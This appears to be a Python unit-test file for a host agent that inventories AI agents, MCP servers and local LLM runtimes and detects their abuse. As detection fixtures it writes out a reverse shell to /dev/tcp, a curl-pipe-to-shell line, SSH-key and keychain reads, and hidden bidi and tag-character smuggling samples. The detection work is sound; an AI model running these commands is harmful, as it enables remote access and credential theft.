#!/usr/bin/env python3
"""AI Surface Inventory (Phase 1 of AI-agent-abuse detection) — the inventory is read-only,
the four scored exposures fire on exactly the right conditions, and the two privacy walls hold.

The collector catalogues every AI agent / local runtime / MCP server / instruction file on the host
and emits a scored node ONLY for a genuine exposure: F1 remote-url MCP (T1567), F2 npx/uvx-fetched MCP
(T1195), F3 a local LLM runtime reachable off-loopback (T1133), F4 an MCP config or instruction file an
attacker could rewrite (T1574). Privacy walls: MCP env is captured as KEY NAMES only (never values) and
remote MCP urls keep the HOST only (never a querystring token); instruction files are captured as
path + sha256 + mtime only (never content).

Pure stdlib. Run from the repo root:  python3 -m unittest discover -s tests -v
"""
import json
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import agent  # noqa: E402


def _write(path, text):
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(text)


def _dump(path, obj):
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(obj, fh)


def _findings_by_mitre(nodes):
    out = {}
    for n in nodes:
        out.setdefault(n["reasons"][0]["mitre"], []).append(n)
    return out


class McpParsing(unittest.TestCase):
    def test_remote_npx_and_env_keyname_only(self):
        tmp = tempfile.mkdtemp()
        cfg = os.path.join(tmp, "mcp.json")
        _dump(cfg, {"mcpServers": {
            "weather-remote": {"url": "https://mcp.example.com/sse?token=SECRET_TOKEN_123", "type": "sse"},
            "fetchpkg": {"command": "npx", "args": ["-y", "@evil/mcp-fetch"],
                         "env": {"API_KEY": "s3cr3t-value", "DEBUG": "1"}},
            "localstdio": {"command": "/usr/local/bin/mymcp", "args": [], "env": {"TOKEN": "abc"}},
        }})

        orig = agent._mcp_config_paths
        agent._mcp_config_paths = lambda: [(cfg, "Cursor", "project")]
        try:
            c = agent.AISurfaceCollector(enabled=True, endpoints=None)
            mcp = c._gather_mcp()
        finally:
            agent._mcp_config_paths = orig

        by_name = {s["name"]: s for s in mcp}
        self.assertEqual(set(by_name), {"weather-remote", "fetchpkg", "localstdio"})

        # remote: host captured, token NOT captured anywhere
        rem = by_name["weather-remote"]
        self.assertEqual(rem["transport"], "remote")
        self.assertEqual(rem["url_host"], "mcp.example.com")
        self.assertNotIn("SECRET_TOKEN_123", json.dumps(rem))

        # npx-fetched: flagged, package captured
        fetched = by_name["fetchpkg"]
        self.assertTrue(fetched["fetched"])
        self.assertEqual(fetched["package"], "@evil/mcp-fetch")
        # env KEY NAMES only, never values
        self.assertEqual(fetched["env_keys"], ["API_KEY", "DEBUG"])
        self.assertNotIn("s3cr3t-value", json.dumps(fetched))

        # plain stdio local server: no exposure flags
        loc = by_name["localstdio"]
        self.assertEqual(loc["transport"], "stdio")
        self.assertFalse(loc["fetched"])
        self.assertEqual(loc["env_keys"], ["TOKEN"])


class Findings(unittest.TestCase):
    def test_four_findings_fire_on_the_right_conditions(self):
        tmp = tempfile.mkdtemp()
        cfg = os.path.join(tmp, "mcp.json")
        _dump(cfg, {"mcpServers": {
            "remote1": {"url": "https://api.example.com/mcp", "type": "http"},
            "npxfetch": {"command": "uvx", "args": ["some-mcp-pkg"]},
            "normal": {"command": "/opt/mcp/bin/server"},
        }})
        os.chmod(cfg, 0o666)                         # world-writable -> F4(config)

        ctx = os.path.join(tmp, "CLAUDE.md")
        _write(ctx, "# rules\n")
        os.chmod(ctx, 0o666)                         # world-writable -> F4(context)

        orig_paths = agent._mcp_config_paths
        orig_roots = agent._ai_project_roots
        orig_home = agent._ai_home
        agent._mcp_config_paths = lambda: [(cfg, "Cursor", "project")]
        agent._ai_project_roots = lambda limit=60: []
        agent._ai_home = lambda: "/nonexistent-home-xyz"
        try:
            c = agent.AISurfaceCollector(enabled=True, endpoints=None, context_roots=[tmp])
            c._collect()
            nodes = c.snapshot()
        finally:
            agent._mcp_config_paths = orig_paths
            agent._ai_project_roots = orig_roots
            agent._ai_home = orig_home

        by_mitre = _findings_by_mitre(nodes)
        # F1 remote MCP (T1567), F2 npx-fetched (T1195.x), F4 writable config+context (T1574 x2)
        self.assertEqual(len(by_mitre.get("T1567", [])), 1, "F1 remote MCP")
        self.assertTrue(any(m.startswith("T1195") for m in by_mitre), "F2 npx-fetched MCP")
        t1574 = by_mitre.get("T1574", [])
        self.assertEqual(len(t1574), 2, "F4 world-writable config + context")
        for n in nodes:
            self.assertEqual(n["severity"], agent.severity_for(n["score"]))
            self.assertTrue(n["type"].startswith("ai-"))

    def test_world_writable_mcp_file_flags_once_not_per_server(self):
        # a config file with three servers, world-writable, yields ONE F4(config), not three
        tmp = tempfile.mkdtemp()
        cfg = os.path.join(tmp, "mcp.json")
        _dump(cfg, {"mcpServers": {"a": {"command": "x"}, "b": {"command": "y"},
                                   "c": {"command": "z"}}})
        os.chmod(cfg, 0o666)
        orig = agent._mcp_config_paths
        agent._mcp_config_paths = lambda: [(cfg, "Cursor", "project")]
        try:
            c = agent.AISurfaceCollector(enabled=True, endpoints=None)
            c._collect()
            writable = [n for n in c.snapshot()
                        if n["detail"].get("finding") == "world-writable-config"]
        finally:
            agent._mcp_config_paths = orig
        self.assertEqual(len(writable), 1)

    def test_runtime_exposed_only_when_off_loopback(self):
        c = agent.AISurfaceCollector(enabled=True, endpoints=None)
        # loopback-bound Ollama -> catalogued, NO finding
        procs = {}
        net_loop = {111: [{"state": "LISTEN", "laddr": "127.0.0.1", "lport": "11434",
                           "raddr": "", "rport": "", "proto": "TCP"}]}
        rts = c._gather_runtimes(procs, net_loop)
        self.assertEqual(len(rts), 1)
        self.assertEqual(rts[0]["name"], "Ollama")
        self.assertFalse(rts[0]["public"])
        # 0.0.0.0-bound -> public -> F3
        net_pub = {111: [{"state": "LISTEN", "laddr": "*", "lport": "11434",
                          "raddr": "", "rport": "", "proto": "TCP"}]}
        rts2 = c._gather_runtimes(procs, net_pub)
        self.assertTrue(rts2[0]["public"])

    def test_no_false_positive_on_common_system_ports(self):
        # 5000 (macOS AirPlay) / 8000 (dev servers) must NOT be read as runtimes
        c = agent.AISurfaceCollector(enabled=True, endpoints=None)
        net = {222: [{"state": "LISTEN", "laddr": "*", "lport": "5000", "raddr": "", "rport": "", "proto": "TCP"}],
               333: [{"state": "LISTEN", "laddr": "*", "lport": "8000", "raddr": "", "rport": "", "proto": "TCP"}]}
        self.assertEqual(c._gather_runtimes({}, net), [])


class ContextPrivacy(unittest.TestCase):
    def test_instruction_file_hash_and_mtime_only_never_content(self):
        tmp = tempfile.mkdtemp()
        secret = "SECRET-PROMPT-INJECTION-STRING"
        p = os.path.join(tmp, "AGENTS.md")
        _write(p, "# agents\n" + secret + "\n")

        orig_home = agent._ai_home
        orig_roots = agent._ai_project_roots
        agent._ai_home = lambda: "/nonexistent-home-xyz"
        agent._ai_project_roots = lambda limit=60: []
        try:
            c = agent.AISurfaceCollector(enabled=True, endpoints=None, context_roots=[tmp])
            ctx = c._gather_context()
        finally:
            agent._ai_home = orig_home
            agent._ai_project_roots = orig_roots

        self.assertEqual(len(ctx), 1)
        rec = ctx[0]
        self.assertEqual(len(rec["sha256"]), 64)
        self.assertIn("mtime", rec)
        self.assertNotIn(secret, json.dumps(rec))   # content never captured


class LlmEndpointFeed(unittest.TestCase):
    def test_static_set_and_suffix_matching(self):
        feed = agent.LLMEndpointFeed(enabled=True, feed_url=None, cache_file=None)
        self.assertEqual(feed.provider_for_host("api.openai.com"), "OpenAI")
        self.assertEqual(feed.provider_for_host("api.anthropic.com"), "Anthropic")
        # azure suffix
        self.assertEqual(feed.provider_for_host("my-resource.openai.azure.com"), "Azure OpenAI")
        # bedrock narrowed to bedrock-runtime.*
        self.assertEqual(feed.provider_for_host("bedrock-runtime.us-east-1.amazonaws.com"), "AWS Bedrock")
        self.assertIsNone(feed.provider_for_host("s3.us-east-1.amazonaws.com"))
        self.assertIsNone(feed.provider_for_host("example.com"))
        self.assertGreaterEqual(feed.status()["static"], 15)


class EgressAnomaly(unittest.TestCase):
    """Phase 2 — a non-AI, non-browser process reaching an LLM API scores; the AI inventory and
    browsers are the allow-list; normal-path interpreters and other apps stay quiet."""

    def _classify(self, exe, cmdline, pid=1, ai_pids=frozenset(), homes=("/Users/alice",)):
        c = agent.AISurfaceCollector(enabled=True, endpoints=None)
        ai_bases = set(agent.AI_AGENT_CLIS) | set(agent.AI_RUNTIMES)
        return c._classify_egress({"exe": exe, "cmdline": cmdline}, pid, set(ai_pids), ai_bases, list(homes))

    def test_classification_matrix(self):
        # expected (score 0): catalogued AI client (by name and by pid), browser, normal-path script
        self.assertEqual(self._classify("/opt/homebrew/bin/claude", "claude")[0], "ai-client")
        self.assertEqual(self._classify("/x/weird", "weird", pid=42, ai_pids={42})[0], "ai-client")
        self.assertEqual(self._classify("/Applications/Google Chrome.app/Contents/MacOS/Google Chrome Helper", "x")[0], "browser")
        self.assertEqual(self._classify("/usr/bin/python3", "python3 /Users/alice/proj/app.py")[0], "script")
        self.assertEqual(self._classify("/Applications/Weather.app/Contents/MacOS/Weather", "Weather")[0], "other")
        # scored (the LAMEHUG shape)
        cat, score, _ = self._classify("/tmp/.x/payload", "/tmp/.x/payload")
        self.assertEqual(cat, "anomalous")
        self.assertGreaterEqual(score, 70)
        self.assertEqual(self._classify("/usr/bin/python3", "python3 -c import urllib")[0], "anomalous")
        self.assertEqual(self._classify("/bin/bash", "bash -c curl ...")[0], "anomalous")
        cat, score, _ = self._classify("/usr/bin/curl", "curl https://api.openai.com/v1")
        self.assertEqual(cat, "raw-tool")
        self.assertEqual(agent.severity_for(score), "medium")

    def test_f5_finding_emission_and_allowlist(self):
        c = agent.AISurfaceCollector(
            enabled=True, endpoints=agent.LLMEndpointFeed(enabled=True, feed_url=None, cache_file=None))
        c._endpoint_ip_map = lambda: {"5.6.7.8": "OpenAI", "1.2.3.4": "Anthropic", "9.9.9.9": "Anthropic"}
        procs = {
            501: {"exe": "/tmp/.x/payload", "cmdline": "/tmp/.x/payload", "user": "alice"},
            502: {"exe": "/usr/bin/python3", "cmdline": "python3 -c import urllib", "user": "alice"},
            503: {"exe": "/opt/homebrew/bin/claude", "cmdline": "claude", "user": "alice"},
            504: {"exe": "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome Helper",
                  "cmdline": "x", "user": "alice"},
        }
        net = {501: [{"state": "ESTABLISHED", "raddr": "5.6.7.8", "rport": "443"}],
               502: [{"state": "ESTABLISHED", "raddr": "1.2.3.4", "rport": "443"}],
               503: [{"state": "ESTABLISHED", "raddr": "9.9.9.9", "rport": "443"}],
               504: [{"state": "ESTABLISHED", "raddr": "9.9.9.9", "rport": "443"}]}
        orig_p, orig_n = agent.collect_processes, agent.collect_network
        agent.collect_processes = lambda: procs
        agent.collect_network = lambda: net
        c._gather_mcp = lambda: []
        c._gather_context = lambda: []
        try:
            c._collect()
        finally:
            agent.collect_processes, agent.collect_network = orig_p, orig_n
        egress = [n for n in c.snapshot() if n["type"] == "ai-egress"]
        labels = " ".join(n["label"] for n in egress)
        self.assertEqual(len(egress), 2)                      # payload + python3 only
        self.assertIn("payload", labels)
        self.assertIn("python3", labels)
        self.assertNotIn("claude", labels)                   # AI client allow-listed
        self.assertNotIn("Chrome", labels)                   # browser allow-listed
        self.assertEqual(c.detail()["counts"]["egress_anomalies"], 2)
        for n in egress:
            self.assertEqual(n["reasons"][0]["mitre"], "T1071.001")


class LamehugAdvisory(unittest.TestCase):
    def test_hunt_sql_catches_the_shape(self):
        import sqlite3
        import time as _t
        con = sqlite3.connect(":memory:")
        con.executescript(agent.HISTORY_SCHEMA)
        now = int(_t.time())
        rows = [
            ("k1", 501, "python3", "/usr/bin/python3", "outbound", "tcp", "", "", "104.18.1.1", "443",
             "ESTABLISHED", 1, "info", "US", "13335", "Cloudflare", now, now, 3),
            ("k2", 503, "payload", "/tmp/.x/payload", "outbound", "tcp", "", "", "5.6.7.8", "443",
             "ESTABLISHED", 1, "info", "US", "16509", "Amazon", now, now, 2),
            ("k3", 504, "Google Chrome", "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
             "outbound", "tcp", "", "", "9.9.9.9", "443", "ESTABLISHED", 1, "info", "US", "13335",
             "Cloudflare", now, now, 99),
            ("k4", 505, "myserver", "/opt/app/bin/myserver", "outbound", "tcp", "", "", "8.8.8.8", "443",
             "ESTABLISHED", 1, "info", "US", "15169", "Google", now, now, 5),
        ]
        con.executemany("INSERT INTO connections VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)", rows)
        hunt = [h for h in agent.ADVISORY_HUNTS if h["id"] == "llm-egress-lamehug-2026-11"][0]
        tool = [r[1] for r in con.execute(hunt["hunts"][0]["sql"]).fetchall()]
        self.assertIn("python3", tool)
        self.assertNotIn("Google Chrome", tool)          # browser not matched
        self.assertNotIn("myserver", tool)               # normal binary not matched
        dropped = [r[1] for r in con.execute(hunt["hunts"][1]["sql"]).fetchall()]
        self.assertEqual(dropped, ["payload"])


class CollectorContract(unittest.TestCase):
    def test_summary_and_detail_shape(self):
        # the live collector must produce a meta summary and a /api/ai-surface detail without raising.
        # baseline_file=None keeps the test hermetic (no state written next to the agent).
        c = agent.AISurfaceCollector(enabled=True, endpoints=None, baseline_file=None)
        c._collect()
        s = c.summary()
        for k in ("enabled", "agents", "runtimes", "mcp", "context", "egress", "flagged"):
            self.assertIn(k, s)
        d = c.detail()
        for k in ("enabled", "agents", "runtimes", "mcp", "context", "counts"):
            self.assertIn(k, d)
        self.assertEqual(d["enabled"], True)


class AiAgentLineage(unittest.TestCase):
    """Phase 3 — behavioral correlation. An already-flagged dangerous action whose process ancestry
    includes a catalogued AI agent/runtime is elevated to high with a 'Driven by an AI agent' reason;
    anything else is left untouched (strong gate: flagged AND agent-ancestor AND a danger technique)."""

    @staticmethod
    def _node(sev, techs, ancestry):
        score = {"high": 70, "medium": 40, "low": 20, "info": 0}[sev]
        return {"type": "process", "severity": sev, "score": score,
                "reasons": [agent.reason("flagged", t, 50) for t in techs],
                "detail": {"pid": 1, "ancestry": ancestry}}

    def _elevated(self, n):
        return any("Driven by an AI agent" in r["text"] for r in n["reasons"])

    def test_cred_read_under_agent_elevates(self):
        n = self._node("medium", ["T1552.001"], "launchd > claude > bash")
        self.assertEqual(agent.correlate_ai_agent_lineage([n]), 1)
        self.assertTrue(self._elevated(n))
        self.assertEqual(n["severity"], "high")
        self.assertEqual(n["detail"]["ai_lineage"]["agent"], "claude")

    def test_runtime_ancestor_dropper_elevates(self):
        # a local LLM runtime (ollama) spawning an ingress-tool-transfer action = AI-orchestrated shape
        n = self._node("medium", ["T1105"], "launchd > ollama > curl")
        self.assertEqual(agent.correlate_ai_agent_lineage([n]), 1)
        self.assertEqual(n["severity"], "high")

    def test_no_agent_ancestry_untouched(self):
        n = self._node("high", ["T1059"], "launchd > sshd > bash")
        self.assertEqual(agent.correlate_ai_agent_lineage([n]), 0)
        self.assertFalse(self._elevated(n))

    def test_agent_ancestry_but_benign_technique_untouched(self):
        # process discovery (T1057) under an agent is ordinary agent work — not a danger technique
        n = self._node("low", ["T1057"], "launchd > claude > ps")
        self.assertEqual(agent.correlate_ai_agent_lineage([n]), 0)
        self.assertFalse(self._elevated(n))

    def test_info_node_not_elevated(self):
        # only an ALREADY-FLAGGED node is elevated; an info node is never pulled up
        n = self._node("info", ["T1552"], "launchd > claude > bash")
        self.assertEqual(agent.correlate_ai_agent_lineage([n]), 0)
        self.assertEqual(n["severity"], "info")

    def test_never_escalates_to_critical(self):
        n = self._node("high", ["T1486"], "launchd > cursor > sh")
        n["severity"] = "critical"
        n["score"] = 90
        agent.correlate_ai_agent_lineage([n])
        # a critical stays critical (elevation floors to high, never above)
        self.assertEqual(n["severity"], "critical")

    def test_idempotent_no_duplicate_reason(self):
        n = self._node("medium", ["T1552"], "launchd > aider > bash")
        agent.correlate_ai_agent_lineage([n])
        agent.correlate_ai_agent_lineage([n])
        hits = [r for r in n["reasons"] if "Driven by an AI agent" in r["text"]]
        self.assertEqual(len(hits), 1)


class HiddenInstructionScan(unittest.TestCase):
    """Phase 4 — the invisible/bidi instruction-smuggling scanner: fires on hidden control characters,
    stays silent on ordinary text, and never returns file content (the Phase-1 privacy wall holds)."""

    def test_clean_file_is_silent(self):
        self.assertIsNone(agent._scan_hidden_instructions(b"# CLAUDE.md\nJust normal rules.\n"))
        self.assertIsNone(agent._scan_hidden_instructions("Accented but visible: café.".encode("utf-8")))

    def test_bidi_and_zero_width_detected(self):
        data = "Visible‮HIDDEN‬ and a​joiner".encode("utf-8")
        r = agent._scan_hidden_instructions(data)
        self.assertIsNotNone(r)
        self.assertGreaterEqual(r["count"], 2)
        self.assertIn("bidi-control", r["categories"])
        self.assertIn("zero-width", r["categories"])
        self.assertTrue(all(cp.startswith("U+") for cp in r["codepoints"]))

    def test_privacy_no_content_returned(self):
        data = "SECRETWORD​more".encode("utf-8")
        r = agent._scan_hidden_instructions(data)
        self.assertNotIn("SECRETWORD", json.dumps(r))

    def test_tag_block_smuggling_detected(self):
        data = ("ok" + chr(0xE0041) + chr(0xE0042)).encode("utf-8")  # TAG LATIN A, B
        r = agent._scan_hidden_instructions(data)
        self.assertIn("tag-smuggling", r["categories"])


class Phase4Integrity(unittest.TestCase):
    """Phase 4 — change-watch + hidden-instruction finding over the AI surface baseline. First run is
    learn-only; a later edit is annotated (not alarmed); a changed file that now carries hidden
    characters is the scored tamper finding."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.bf = os.path.join(self.tmp, "ai-surface-baseline.json")
        self.cf = os.path.join(self.tmp, "CLAUDE.md")
        self._home, self._roots = agent._ai_home, agent._ai_project_roots
        agent._ai_home = lambda: self.tmp
        agent._ai_project_roots = lambda: [self.tmp]

    def tearDown(self):
        agent._ai_home, agent._ai_project_roots = self._home, self._roots

    def _collector(self):
        return agent.AISurfaceCollector(enabled=True, endpoints=None, baseline_file=self.bf)

    def _ctx(self, c):
        return next(x for x in c.inv["context"] if x["path"] == self.cf)

    def test_first_run_learn_only(self):
        _write(self.cf, "v1 rules")
        c = self._collector()
        c._collect()
        rec = self._ctx(c)
        self.assertFalse(rec.get("changed"))
        self.assertFalse(rec.get("new"))

    def test_edit_is_marked_changed_but_not_scored(self):
        _write(self.cf, "v1 rules")
        c = self._collector()
        c._collect()                       # learn
        _write(self.cf, "v2 rules, edited plainly")
        c._collect()
        self.assertTrue(self._ctx(c)["changed"])
        # a plain edit raises no hidden-instruction finding
        f6 = [i for i in c.snapshot() if i["detail"].get("finding") == "hidden-instructions"]
        self.assertEqual(f6, [])

    def test_changed_plus_hidden_scores_high(self):
        _write(self.cf, "v1 rules")
        c = self._collector()
        c._collect()                       # learn
        with open(self.cf, "w", encoding="utf-8") as fh:
            fh.write("v2‮evil‬ rules")
        c._collect()
        f6 = [i for i in c.snapshot() if i["detail"].get("finding") == "hidden-instructions"]
        self.assertEqual(len(f6), 1)
        self.assertEqual(f6[0]["score"], 70)          # changed + hidden
        self.assertEqual(f6[0]["severity"], "high")
        self.assertTrue(f6[0]["detail"]["changed"])
        self.assertEqual(c.summary()["hidden_instructions"], 1)
        self.assertEqual(c.summary()["changed_context"], 1)


class LolaiAdvisory(unittest.TestCase):
    """The living-off-AI advisory hunt (lolai-agent-lineage-2026-11) is present and its history SQL is
    valid against the real `processes` schema, matching an agent-parented sensitive action."""

    DDL = ("CREATE TABLE processes(key TEXT PRIMARY KEY, pid INTEGER, ppid INTEGER, ppid_name TEXT,"
           " user TEXT, name TEXT, exe TEXT, cmdline TEXT, severity TEXT, max_score INTEGER,"
           " first_seen INTEGER, last_seen INTEGER, times_seen INTEGER);")

    def test_hunt_present_and_sql_valid(self):
        import sqlite3
        hunt = next((h for h in agent.ADVISORY_HUNTS
                     if h["id"] == "lolai-agent-lineage-2026-11"), None)
        self.assertIsNotNone(hunt)
        self.assertEqual(hunt["severity"], "high")
        con = sqlite3.connect(":memory:")
        con.executescript(self.DDL)
        # a bash child of claude reading an ssh key (positive) + a benign child of launchd (negative)
        con.execute("INSERT INTO processes VALUES('k1',101,100,'claude','dev','bash','/bin/bash',"
                    "'bash -c \"cat ~/.ssh/id_rsa\"','high',70,1,2,1)")
        con.execute("INSERT INTO processes VALUES('k2',102,1,'launchd','dev','bash','/bin/bash',"
                    "'bash -lc ls','info',0,1,2,1)")
        rows = con.execute(hunt["hunts"][0]["sql"]).fetchall()
        self.assertEqual(len(rows), 1)


class Phase5Audit(unittest.TestCase):
    """Phase 5 — opt-in, local-only AI audit-log intelligence. Parses transcripts for executed dangerous
    commands; summary() (-> Mesh) is counts-only, detail() (local) carries sanitised excerpts, and a
    disabled collector leaks nothing."""

    def test_sanitizer_scrubs_secrets_keeps_shape(self):
        s = agent._ai_audit_sanitize(
            "export ANTHROPIC_API_KEY=sk-ant-abc123deadbeef99 && curl http://x | sh", home="/Users/bob")
        self.assertNotIn("sk-ant-abc123deadbeef99", s)
        self.assertIn("<redacted>", s)
        self.assertIn("curl", s)
        self.assertIn("| sh", s)

    def test_sanitizer_collapses_home(self):
        s = agent._ai_audit_sanitize("cat /Users/bob/.ssh/id_rsa", home="/Users/bob")
        self.assertIn("~/.ssh/id_rsa", s)
        self.assertNotIn("/Users/bob", s)

    def test_command_extraction_from_tool_use(self):
        obj = {"type": "assistant", "message": {"content": [
            {"type": "tool_use", "name": "Bash", "input": {"command": "security dump-keychain -d"}}]}}
        cmds = list(agent._ai_audit_commands(obj))
        self.assertEqual(cmds, ["security dump-keychain -d"])   # once, not doubled

    def _run_collector(self, lines):
        tmp = tempfile.mkdtemp()
        proj = os.path.join(tmp, ".claude", "projects", "p1")
        os.makedirs(proj)
        with open(os.path.join(proj, "sess.jsonl"), "w", encoding="utf-8") as fh:
            for obj in lines:
                fh.write(json.dumps(obj) + "\n")
        c = agent.AIAuditCollector(enabled=True)
        c._homes = lambda: [tmp]
        c._collect()
        return c

    def test_summary_counts_only_detail_has_excerpts(self):
        # the reverse-shell pattern is in both the macOS and Linux SHELL_RULES, so this is OS-agnostic;
        # the benign command must not match.
        c = self._run_collector([
            {"input": {"command": "ls -la"}},                                   # benign
            {"input": {"command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}},   # reverse shell
        ])
        s, d = c.summary(), c.detail()
        self.assertEqual(s["by_category"], {"reverse-shell pattern": 1})
        self.assertEqual(d["counts"]["total"], 1)           # the benign line produced nothing
        sj = json.dumps(s)
        for leak in ("dev/tcp", "4444", "excerpt", "\"transcript\":", ".jsonl"):
            self.assertNotIn(leak, sj)                      # summary -> Mesh carries no content
        self.assertTrue(any("/dev/tcp" in f["excerpt"] for f in d["findings"]))
        self.assertTrue(all(f["transcript"].startswith("~") for f in d["findings"]))

    def test_disabled_collector_leaks_nothing(self):
        c = agent.AIAuditCollector(enabled=False)
        self.assertEqual(c.summary(), {"enabled": False})
        self.assertEqual(c.detail()["enabled"], False)

    def test_api_ai_audit_not_relay_whitelisted(self):
        # the Mesh relay can only fetch VIEW_WHITELIST endpoints; the audit EXCERPTS must never be in it,
        # while the counts-only summary IS shared so the fleet can tally categories.
        wl = agent.MeshReporter.VIEW_WHITELIST
        self.assertNotIn("/api/ai-audit", wl)            # excerpts stay local
        self.assertIn("/api/ai-audit-summary", wl)       # counts reach the Mesh
        self.assertIn("/api/ai-surface", wl)             # sanity: surface IS shared


if __name__ == "__main__":
    unittest.main()
